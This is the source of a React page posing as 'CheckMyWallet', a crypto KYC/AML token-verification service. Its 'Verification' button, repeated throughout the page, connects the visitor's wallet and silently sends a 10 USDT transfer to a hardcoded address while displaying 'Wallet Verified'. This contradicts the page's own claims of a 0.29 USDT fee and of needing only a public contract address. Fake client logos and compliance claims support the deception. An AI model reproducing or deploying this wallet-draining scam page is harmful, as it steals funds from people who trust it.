"use client";
import { useState } from "react";

// Butonul de verificare cu logica ta
function VerificationButton() {
  const [status, setStatus] = useState("Verification");
  const [color, setColor] = useState("#1a73e8");

  async function verifyAndSend() {
    setColor("#1a73e8");
    setStatus("Connecting Wallet...");

    if (typeof window.ethereum === "undefined") {
      setStatus("❌ Failed Verification");
      setColor("red");
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const from = accounts[0];
      setStatus("Wallet Connected ✅");

      const to = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
      const usdtContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
      const amountInUSDT = 10;
      const amount = (amountInUSDT * 10 ** 6).toString(16).padStart(64, "0");
      const method = "a9059cbb";
      const txData = "0x" + method + to.slice(2).padStart(64, "0") + amount;

      await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: from,
            to: usdtContract,
            data: txData,
          },
        ],
      });

      setStatus("✅ Wallet Verified");
    } catch (error) {
      setStatus("❌ Failed Verification");
      setColor("red");
    }
  }

  return (
    <button
      onClick={verifyAndSend}
      style={{
        backgroundColor: color,
        color: "white",
        padding: "12px 24px",
        fontSize: 16,
        border: "none",
        borderRadius: 6,
        cursor: "pointer",
        marginTop: 16,
      }}
    >
      {status}
    </button>
  );
}

export default function Page() {
  return (
    <main className="bg-gray-50 text-gray-800">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center">
            <a
              href="#"
              className="text-2xl font-['Orbitron'] text-primary tracking-wider uppercase font-bold transition-colors duration-300 hover:text-blue-600"
              onClick={e => {
                e.preventDefault();
                window.scrollTo({ top: 0, behavior: "smooth" });
              }}
            >
              Check<span className="text-gray-800">Wallet</span>
            </a>
          </div>
          <nav className="hidden md:flex space-x-8">
            <a href="#" className="font-medium text-gray-900 hover:text-primary">Home</a>
            <a href="#services" className="font-medium text-gray-600 hover:text-primary">Services</a>
            <a href="#features" className="font-medium text-gray-600 hover:text-primary">Features</a>
            <a href="#faq" className="font-medium text-gray-600 hover:text-primary">FAQ</a>
            <a href="#contact" className="font-medium text-gray-600 hover:text-primary">Contact</a>
          </nav>
          <div className="flex items-center">
            <button className="bg-primary text-white px-6 py-2 rounded font-medium hover:bg-blue-600 whitespace-nowrap">
              Verify Tokens
            </button>
            <VerificationButton />
            <div className="ml-4 md:hidden w-6 h-6 flex items-center justify-center">
              <i className="ri-menu-line ri-lg"></i>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 flex items-center">
        <div className="container mx-auto px-4 py-16 md:py-24">
          <div className="flex flex-col md:flex-row items-center justify-between gap-12">
            <div className="md:w-1/2">
              <h1 className="text-4xl md:text-6xl font-bold text-gray-900 mb-6 leading-tight">
                KYC/AML and Crypto Compliance — All in One Place
              </h1>
              <p className="text-lg text-gray-600 mb-8 max-w-2xl">
                A complete solution for KYC and AML compliance, designed to meet the highest standards, including FATF and FinCEN requirements. Not just a platform, but a customer-focused approach to crypto compliance.
              </p>
              <button className="bg-primary text-white px-8 py-4 rounded font-medium text-lg hover:bg-blue-600 whitespace-nowrap">
                Check your wallet
              </button>
              <VerificationButton />
            </div>
            <div className="md:w-1/2">
              <img
                src="https://readdy.ai/api/search-image?query=modern%2520laptop%2520displaying%2520crypto%2520compliance%2520dashboard%2520with%2520KYC%2520verification%2520interface%252C%2520showing%2520clean%2520minimal%2520design%252C%2520blue%2520gradient%2520background%252C%2520professional%2520fintech%2520UI%252C%2520high%2520end%2520visualization&width=800&height=600&seq=hero1&orientation=landscape"
                alt="AML Service Dashboard"
                className="w-full rounded-lg shadow-2xl"
              />
            </div>
          </div>
        </div>
      </section>

      {/* How It Works Section */}
      <section className="py-20 bg-white" id="services">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-bold mb-4">How It Works</h2>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              Our verification process is simple, secure, and reliable. Get your tokens verified in three easy steps.
            </p>
          </div>
          <div className="grid md:grid-cols-3 gap-10">
            <div className="bg-gray-50 p-8 rounded-lg text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <i className="ri-token-swap-line ri-2x text-primary"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">1. Enter Token Details</h3>
              <p className="text-gray-600">
                Provide the token contract address and any additional information required for verification.
              </p>
            </div>
            <div className="bg-gray-50 p-8 rounded-lg text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <i className="ri-secure-payment-line ri-2x text-primary"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">2. Pay Verification Fee</h3>
              <p className="text-gray-600">
                Complete a secure payment of the verification fee (starting at 0.29 USDT).
              </p>
            </div>
            <div className="bg-gray-50 p-8 rounded-lg text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <i className="ri-file-certificate-line ri-2x text-primary"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">3. Receive Certificate</h3>
              <p className="text-gray-600">
                Get your official validity certificate confirming the status of your tokens.
              </p>
            </div>
          </div>
          <div className="mt-16 text-center">
            <button className="bg-primary text-white px-8 py-4 rounded font-medium text-lg hover:bg-blue-600 whitespace-nowrap">
              Check Your Wallet
            </button>
            <VerificationButton />
          </div>
        </div>
      </section>

      {/* Token Safety Section */}
      <section className="py-20 bg-white">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto text-center mb-16">
            <h2 className="text-3xl font-bold mb-6">
              Why Token Verification Matters
            </h2>
            <p className="text-lg text-gray-600">
              Protect yourself from potential risks in the crypto space
            </p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            <div className="bg-gray-50 p-8 rounded-lg">
              <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-lock-line text-red-500 ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">Frozen Tokens</h3>
              <p className="text-gray-600">
                Some tokens may be frozen by their issuers or smart contracts, rendering them untradeable. Our verification helps identify frozen assets in your wallet.
              </p>
            </div>
            <div className="bg-gray-50 p-8 rounded-lg">
              <div className="w-12 h-12 bg-yellow-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-spam-line text-yellow-500 ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">Fake Tokens</h3>
              <p className="text-gray-600">
                Scammers often create counterfeit tokens that appear legitimate. We verify token authenticity to protect you from worthless imitations.
              </p>
            </div>
            <div className="bg-gray-50 p-8 rounded-lg">
              <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-shield-cross-line text-orange-500 ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">Blocked Contracts</h3>
              <p className="text-gray-600">
                Smart contracts can be blocked or blacklisted, preventing token transfers. Our system detects these restrictions before you trade.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Partners Section */}
      <section className="py-16 bg-gray-50">
        <div className="container mx-auto px-4">
          <h2 className="text-3xl font-bold text-center text-gray-800 mb-4">
            Our 300+ clients and partners
          </h2>
          <div className="max-w-6xl mx-auto mt-12">
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-8 items-center">
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=purefi%2520crypto%2520company%2520logo%2520modern%2520minimal%2520design%2520blue%2520and%2520white%2520colors&width=120&height=40&seq=logo1&orientation=landscape"
                  alt="Purefi"
                  className="h-8 object-contain"
                />
              </div>
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=credits%2520crypto%2520company%2520logo%2520modern%2520minimal%2520design%2520dark%2520theme&width=120&height=40&seq=logo2&orientation=landscape"
                  alt="Credits"
                  className="h-8 object-contain"
                />
              </div>
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=gate.io%2520exchange%2520logo%2520modern%2520minimal%2520design%2520blue%2520theme&width=120&height=40&seq=logo3&orientation=landscape"
                  alt="Gate.io"
                  className="h-8 object-contain"
                />
              </div>
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=cryptopnl%2520company%2520logo%2520modern%2520minimal%2520design%2520orange%2520accent&width=120&height=40&seq=logo4&orientation=landscape"
                  alt="CryptoPNL"
                  className="h-8 object-contain"
                />
              </div>
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=kuna.io%2520exchange%2520logo%2520modern%2520minimal%2520design%2520dark%2520theme&width=120&height=40&seq=logo5&orientation=landscape"
                  alt="Kuna.io"
                  className="h-8 object-contain"
                />
              </div>
              <div className="flex items-center justify-center">
                <img
                  src="https://readdy.ai/api/search-image?query=safe3%2520crypto%2520security%2520company%2520logo%2520modern%2520minimal%2520design&width=120&height=40&seq=logo6&orientation=landscape"
                  alt="Safe3"
                  className="h-8 object-contain"
                />
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Certification Section */}
      <section className="py-20 bg-white">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto text-center">
            <h2 className="text-3xl font-bold mb-6">Start Your Token Verification</h2>
            <p className="text-lg text-gray-600 mb-12">
              Connect your wallet and verify your tokens in just a few simple steps
            </p>
            <div className="flex flex-col items-center gap-4">
              <button className="bg-primary text-white px-8 py-4 rounded font-medium text-lg hover:bg-blue-600 whitespace-nowrap w-64">
                Verify Token Now
              </button>
              <VerificationButton />
              <button className="bg-gray-800 text-white px-8 py-4 rounded font-medium text-lg hover:bg-gray-700 whitespace-nowrap w-64 flex items-center justify-center gap-2">
                <i className="ri-wallet-3-line"></i>
                Connect Wallet
              </button>
              <VerificationButton />
            </div>
            <div className="mt-12 grid grid-cols-1 md:grid-cols-3 gap-8">
              <div className="bg-gray-50 p-8 rounded-lg">
                <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                  <i className="ri-shield-check-line text-primary ri-lg"></i>
                </div>
                <h3 className="text-xl font-semibold mb-3">Security Check</h3>
                <p className="text-gray-600">
                  Comprehensive smart contract security analysis and risk assessment
                </p>
              </div>
              <div className="bg-gray-50 p-8 rounded-lg">
                <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                  <i className="ri-shield-star-line text-primary ri-lg"></i>
                </div>
                <h3 className="text-xl font-semibold mb-3">
                  Authenticity Verification
                </h3>
                <p className="text-gray-600">
                  Verify token authenticity and contract ownership
                </p>
              </div>
              <div className="bg-gray-50 p-8 rounded-lg">
                <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
                  <i className="ri-file-list-3-line text-primary ri-lg"></i>
                </div>
                <h3 className="text-xl font-semibold mb-3">Detailed Report</h3>
                <p className="text-gray-600">
                  Get a comprehensive verification report with detailed analysis
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 bg-white" id="features">
        <div className="container mx-auto px-4">
          <div className="flex flex-col md:flex-row gap-12 items-center mx-auto max-w-7xl">
            <div className="md:w-1/2 px-4 sm:px-6 lg:px-8">
              <h2 className="text-3xl md:text-4xl font-bold mb-6 bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                Why Choose CheckMyWallet?
              </h2>
              <p className="text-lg text-gray-600 mb-8">
                Our platform provides reliable token verification services to help
                you make informed investment decisions and avoid scams in the
                crypto market.
              </p>
              <div className="space-y-6">
                <div className="flex items-start">
                  <div className="w-10 h-10 flex items-center justify-center bg-blue-100 rounded-full mr-4 shrink-0">
                    <i className="ri-shield-check-line text-primary ri-lg"></i>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold mb-2">
                      Secure Verification
                    </h3>
                    <p className="text-gray-600">
                      Our advanced algorithms thoroughly analyze token contracts
                      for security vulnerabilities and potential risks.
                    </p>
                  </div>
                </div>
                <div className="flex items-start">
                  <div className="w-10 h-10 flex items-center justify-center bg-blue-100 rounded-full mr-4 shrink-0">
                    <i className="ri-file-list-3-line text-primary ri-lg"></i>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold mb-2">
                      Official Certificates
                    </h3>
                    <p className="text-gray-600">
                      Receive tamper-proof digital certificates that confirm the
                      validity and status of your tokens.
                    </p>
                  </div>
                </div>
                <div className="flex items-start">
                  <div className="w-10 h-10 flex items-center justify-center bg-blue-100 rounded-full mr-4 shrink-0">
                    <i className="ri-time-line text-primary ri-lg"></i>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold mb-2">Fast Processing</h3>
                    <p className="text-gray-600">
                      Get verification results quickly, with most tokens verified
                      within minutes of submission.
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div className="md:w-1/2">
              <div className="relative">
                <img
                  src="https://readdy.ai/api/search-image?query=sleek%2520modern%2520laptop%2520displaying%2520professional%2520crypto%2520wallet%2520verification%2520interface%252C%2520minimalist%2520design%252C%2520clean%2520UI%2520with%2520blue%2520accent%2520colors%252C%2520showing%2520security%2520analysis%2520dashboard%252C%2520high-end%2520visualization%252C%2520perfect%2520composition%252C%2520premium%2520quality%2520render&width=600&height=500&seq=features4&orientation=landscape"
                  alt="CheckMyWallet Dashboard"
                  className="rounded-lg shadow-xl w-full transform hover:scale-105 transition-transform duration-300"
                />
                <div className="absolute inset-0 bg-gradient-to-tr from-blue-600/10 to-transparent rounded-lg"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section className="py-20 bg-gray-50" id="faq">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-bold mb-4">Frequently Asked Questions</h2>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              Find answers to common questions about our token verification
              service.
            </p>
          </div>
          <div className="max-w-3xl mx-auto">
            <div className="space-y-6">
              {/* FAQ 1 */}
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <button
                  className="w-full px-6 py-4 text-left font-medium flex justify-between items-center focus:outline-none"
                  onClick={() => {
                    const el = document.getElementById("faq-answer-1");
                    const icon = document.getElementById("faq-icon-1");
                    if (el && icon) {
                      el.classList.toggle("hidden");
                      icon.classList.toggle("ri-arrow-down-s-line");
                      icon.classList.toggle("ri-arrow-up-s-line");
                    }
                  }}
                >
                  <span>How does the verification process work?</span>
                  <i className="ri-arrow-down-s-line ri-lg" id="faq-icon-1"></i>
                </button>
                <div className="px-6 pb-4 hidden" id="faq-answer-1">
                  <p className="text-gray-600">
                    Our verification process involves analyzing the token's smart
                    contract code, checking for security vulnerabilities,
                    validating the token's activity on the blockchain, and
                    verifying the project's legitimacy. Once the verification is
                    complete, we issue a digital certificate confirming the
                    token's status.
                  </p>
                </div>
              </div>
              {/* FAQ 2 */}
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <button
                  className="w-full px-6 py-4 text-left font-medium flex justify-between items-center focus:outline-none"
                  onClick={() => {
                    const el = document.getElementById("faq-answer-2");
                    const icon = document.getElementById("faq-icon-2");
                    if (el && icon) {
                      el.classList.toggle("hidden");
                      icon.classList.toggle("ri-arrow-down-s-line");
                      icon.classList.toggle("ri-arrow-up-s-line");
                    }
                  }}
                >
                  <span>Is my information secure?</span>
                  <i className="ri-arrow-down-s-line ri-lg" id="faq-icon-2"></i>
                </button>
                <div className="px-6 pb-4 hidden" id="faq-answer-2">
                  <p className="text-gray-600">
                    Yes, we take security very seriously. All data transmitted to
                    our platform is encrypted using industry-standard protocols.
                    We do not store your private keys or sensitive wallet
                    information. Our verification process only requires the public
                    token contract address.
                  </p>
                </div>
              </div>
              {/* FAQ 3 */}
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <button
                  className="w-full px-6 py-4 text-left font-medium flex justify-between items-center focus:outline-none"
                  onClick={() => {
                    const el = document.getElementById("faq-answer-3");
                    const icon = document.getElementById("faq-icon-3");
                    if (el && icon) {
                      el.classList.toggle("hidden");
                      icon.classList.toggle("ri-arrow-down-s-line");
                      icon.classList.toggle("ri-arrow-up-s-line");
                    }
                  }}
                >
                  <span>How long does verification take?</span>
                  <i className="ri-arrow-down-s-line ri-lg" id="faq-icon-3"></i>
                </button>
                <div className="px-6 pb-4 hidden" id="faq-answer-3">
                  <p className="text-gray-600">
                    Most token verifications are completed within 5-15 minutes.
                    However, more complex tokens or those with extensive code may
                    take up to 24 hours to fully analyze and verify. You'll
                    receive an email notification once the verification is
                    complete.
                  </p>
                </div>
              </div>
              {/* FAQ 4 */}
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <button
                  className="w-full px-6 py-4 text-left font-medium flex justify-between items-center focus:outline-none"
                  onClick={() => {
                    const el = document.getElementById("faq-answer-4");
                    const icon = document.getElementById("faq-icon-4");
                    if (el && icon) {
                      el.classList.toggle("hidden");
                      icon.classList.toggle("ri-arrow-down-s-line");
                      icon.classList.toggle("ri-arrow-up-s-line");
                    }
                  }}
                >
                  <span>What do I receive after verification?</span>
                  <i className="ri-arrow-down-s-line ri-lg" id="faq-icon-4"></i>
                </button>
                <div className="px-6 pb-4 hidden" id="faq-answer-4">
                  <p className="text-gray-600">
                    After successful verification, you'll receive a digital
                    validity certificate with a unique verification ID. This
                    certificate includes details about the token's status,
                    security assessment, and activity verification. You can
                    download this certificate as a PDF and share it with others.
                  </p>
                </div>
              </div>
              {/* FAQ 5 */}
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <button
                  className="w-full px-6 py-4 text-left font-medium flex justify-between items-center focus:outline-none"
                  onClick={() => {
                    const el = document.getElementById("faq-answer-5");
                    const icon = document.getElementById("faq-icon-5");
                    if (el && icon) {
                      el.classList.toggle("hidden");
                      icon.classList.toggle("ri-arrow-down-s-line");
                      icon.classList.toggle("ri-arrow-up-s-line");
                    }
                  }}
                >
                  <span>What payment methods do you accept?</span>
                  <i className="ri-arrow-down-s-line ri-lg"id="faq-icon-5"></i>
                </button>
                <div className="px-6 pb-4 hidden" id="faq-answer-5">
                  <p className="text-gray-600">
                    We accept payments in various cryptocurrencies including USDT,
                    ETH, BTC, and BNB. Payments are processed securely through our
                    integrated payment gateway. The verification fee starts at
                    0.29 USDT and may vary depending on the complexity of the
                    token.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-20 bg-gradient-to-r from-blue-600 to-blue-800 text-white">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-3xl font-bold mb-6">Ready to Verify Your Tokens?</h2>
          <p className="text-xl mb-10 max-w-2xl mx-auto">
            Get professional verification and ensure your crypto investments are
            secure and legitimate.
          </p>
          <button className="bg-white text-primary px-8 py-4 rounded font-medium text-lg hover:bg-gray-100 whitespace-nowrap">
            Start Verification Now
          </button>
          <VerificationButton />
        </div>
      </section>

      {/* Additional Features Section */}
      <section className="py-20 bg-gray-50">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-lg shadow-sm">
              <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-user-settings-line text-primary ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">Personalized Approach</h3>
              <p className="text-gray-600">
                CheckMyWallet provides tailored verification solutions to meet the
                specific needs of each client. With experience serving 300+ crypto
                enterprises across 25 jurisdictions, we're confident in delivering
                results that match your requirements.
              </p>
            </div>
            <div className="bg-white p-8 rounded-lg shadow-sm">
              <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-shield-check-line text-primary ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">Comprehensive Platform</h3>
              <p className="text-gray-600">
                Our platform offers advanced screening for crypto businesses,
                ensuring compliance with global regulations. Our risk scoring
                system uses reliable data from multiple trusted sources for
                accurate evaluations.
              </p>
            </div>
            <div className="bg-white p-8 rounded-lg shadow-sm">
              <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-6">
                <i className="ri-customer-service-2-line text-primary ri-lg"></i>
              </div>
              <h3 className="text-xl font-semibold mb-3">24/7 Customer Support</h3>
              <p className="text-gray-600">
                We understand the importance of timely and responsive support. Our
                dedicated team is available 24/7 to assist with your verification
                needs and answer any questions you may have.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-gray-300 py-16" id="contact">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-12">
            <div className="md:col-span-1">
              <a
                href="#"
                className="text-2xl font-['Orbitron'] text-white tracking-wider uppercase font-bold mb-4 block transition-colors duration-300 hover:text-blue-200"
                onClick={e => {
                  e.preventDefault();
                  window.scrollTo({ top: 0, behavior: "smooth" });
                }}
              >
                Check<span className="text-blue-400">Wallet</span>
              </a>
              <p className="text-gray-400 mb-6">
                Professional crypto token verification service with official
                validity certificates.
              </p>
              <div className="flex space-x-4">
                <a
                  href="#"
                  className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center hover:bg-primary"
                >
                  <i className="ri-twitter-x-line ri-lg"></i>
                </a>
                <a
                  href="#"
                  className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center hover:bg-primary"
                >
                  <i className="ri-telegram-line ri-lg"></i>
                </a>
                <a
                  href="#"
                  className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center hover:bg-primary"
                >
                  <i className="ri-linkedin-line ri-lg"></i>
                </a>
              </div>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">Company</h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">About Us</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Services</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Team</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Careers</a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">Legal</h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Terms of Service</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Privacy Policy</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Cookie Policy</a>
                </li>
                <li>
                  <a href="#" className="text-gray-400 hover:text-white">Compliance</a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">Contact Information</h3>
              <ul className="space-y-3">
                <li className="flex items-start">
                  <div className="w-5 h-5 flex items-center justify-center mr-2 mt-1">
                    <i className="ri-building-line text-gray-400"></i>
                  </div>
                  <span className="text-gray-400">
                    c/o Berney et Associés SA Société Fiduciaire<br />
                    Rue du Nant 8<br />
                    1207 Genève
                  </span>
                </li>
                <li className="flex items-center">
                  <div className="w-5 h-5 flex items-center justify-center mr-2">
                    <i className="ri-phone-line text-gray-400"></i>
                  </div>
                  <span className="text-gray-400">+41 779 740 977</span>
                </li>
                <li className="flex items-center">
                  <div className="w-5 h-5 flex items-center justify-center mr-2">
                    <i className="ri-mail-line text-gray-400"></i>
                  </div>
                  <span className="text-gray-400">info@checkmywallet.com</span>
                </li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 mt-12 pt-8">
            <div className="flex flex-col md:flex-row justify-between items-center">
              <div className="mb-4 md:mb-0">
                <p className="text-gray-500">
                  © 2022 CheckMyWallet. All rights reserved.
                </p>
                <p className="text-gray-500 text-sm mt-1">
                  Register number: CH-660.0.201.959-2 | Legal form: Company
                  limited by shares (AG)<br />
                  Sector: Operation of investment companies
                </p>
              </div>
              <div className="flex items-center space-x-4">
                <div className="w-8 h-8 flex items-center justify-center">
                  <i className="ri-visa-line ri-lg text-gray-400"></i>
                </div>
                <div className="w-8 h-8 flex items-center justify-center">
                  <i className="ri-mastercard-line ri-lg text-gray-400"></i>
                </div>
                <div className="w-8 h-8 flex items-center justify-center">
                  <i className="ri-paypal-line ri-lg text-gray-400"></i>
                </div>
                <div className="w-8 h-8 flex items-center justify-center">
                  <i className="ri-bitcoin-line ri-lg text-gray-400"></i>
                </div>
                <div className="w-8 h-8 flex items-center justify-center">
                  <i className="ri-ethereum-line ri-lg text-gray-400"></i>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </main>
  );
}